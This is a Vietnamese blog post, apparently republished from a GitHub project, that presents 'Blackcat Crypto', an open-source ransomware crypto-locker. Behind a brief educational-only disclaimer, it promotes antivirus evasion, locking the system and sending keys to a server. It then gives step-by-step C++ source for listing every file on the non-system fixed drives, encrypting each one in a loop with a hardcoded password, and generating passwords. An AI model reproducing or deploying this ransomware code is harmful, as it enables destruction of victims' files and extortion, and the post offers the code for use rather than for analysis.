---
title: Mã Độc Blackcat Crypto
date: 10/08/2021
layout: single
header:
  teaser: /assets/images/madoc.jpg
--- 


## Mô Tả 
Khuyến cáo công cụ chỉ mang tính chất giáo dục, không sử dụng các mục đích vi phạm pháp luật, tôi và tác giả của bài viết này sẽ không chịu trách nhiệm với hành động của các bạn với mục đích bất hợp pháp nào Cảm Ơn! 

Blackcat Crypto là Crypto-Locker mã nguồn mở. Blackcat Crypto được phát triển bằng Visual C ++. Nó có các tính năng mã hóa tất cả các tập tin, khóa hệ thống và gửi các khóa trở lại máy chủ. Chức năng đa luồng giúp công cụ này mã hóa nhanh hơn.

Khó có thể bị phát hiện bởi Công cụ chống virus.

Sử dụng thuật toán mã hóa 256-bit mạnh mẽ, Khi một tệp được mã hóa, Tệp sẽ hoàn toàn vô dụng nếu không có mật khẩu. Nó chỉ đơn giản là không thể đọc được [ajayrandhawa/Cryptolocker](https://github.com/ajayrandhawa/Cryptolocker)



## Đặc trưng
1. Mã hóa AES mạnh mẽ.
2. Chức năng hệ thống khóa.
3. Mã hóa đa luồng.


![](https://raw.githubusercontent.com/ajayrandhawa/Cryptolocker/master/ezgif-1-e99b3d2b6b39.gif)
 
## Bước 1 (Fetch files)
Lấy tất cả các tệp từ tất cả các ổ đĩa để mã hóa chúng.

Đây là chương trình Visual C ++ lấy tất cả danh sách thư mục & tệp trong ổ đĩa và lưu trữ đường dẫn trong tệp văn bản để mã hóa sử dụng sau này. Tôi sử dụng thư viện Boost C ++ để lấy danh sách tất cả các tệp. Trước tiên hãy thiết lập thư viện Boost để biên dịch chương trình.

![Language](https://img.shields.io/badge/Lang-c++-blue.svg)

```cpp
#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>

using namespace std;

fstream out_file("data.txt", ios::out);

#define MAX 256

int main(int argc, char* argv[]) {

    int dr_type = 99;
    char dr_avail[MAX];
    char *temp = dr_avail;

    /* 1st we fill the buffer */
    GetLogicalDriveStrings(MAX, dr_avail);
    while (*temp != NULL) { // Split the buffer by null
        dr_type = GetDriveType(temp);

        char skip[10] = "C:\\";

        if (dr_type == 3 && temp[0] != 'C') {

            boost::system::error_code dir_error;

            for (boost::filesystem::recursive_directory_iterator end, dir(temp, dir_error); dir != end; dir.increment(dir_error)) {
                if (dir_error.value()) {
                    cerr << "Error accessing file: " << dir_error.message() << endl;
                }
                else {
                    cout << dir->path() << endl;
                    out_file << dir->path() << "\n";
                }
            }
        }
        temp += lstrlen(temp) + 1;
    }
    out_file.close();
    system("pause");
```

## Bước 2 (Encrypt files)
Trước tiên,  lấy từng đường dẫn tệp từ "data.txt" và gửi tới công cụ crypy này với mã hóa kiểu và mật khẩu. bạn cũng có thể nhúng tất cả chương trình này vào vòng lặp trên để lấy đường dẫn và mã hóa dữ liệu một cách đệ quy.

```cpp
out_file.open("data.txt", ios::in);
    string line;
    while (out_file.good()) {
        getline(out_file, line);
        cout << line << endl;
        std::string cmmd = "crpt.exe -e -p 4321 ";
        cmmd += line;
        system(cmmd.c_str());
    }

```
## Bước 3 (Create Long String Complex Password Function)
Gửi độ dài đến hàm và hàm trả về mật khẩu phức tạp dài được tạo mà bạn có thể sử dụng để mã hóa.
```cpp
string RandomString(int len)
{
    srand(time(0));
    string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    string newstr;
    int pos;
    while (newstr.size() != len) {
        pos = ((rand() % (str.size() - 1)));
        newstr += str.substr(pos, 1);
    }
    return newstr;
}

```

## Bài viết được chia sẻ bởi tác giả [ajayrandhawa](https://github.com/ajayrandhawa/)

## Chúc may mắn :D

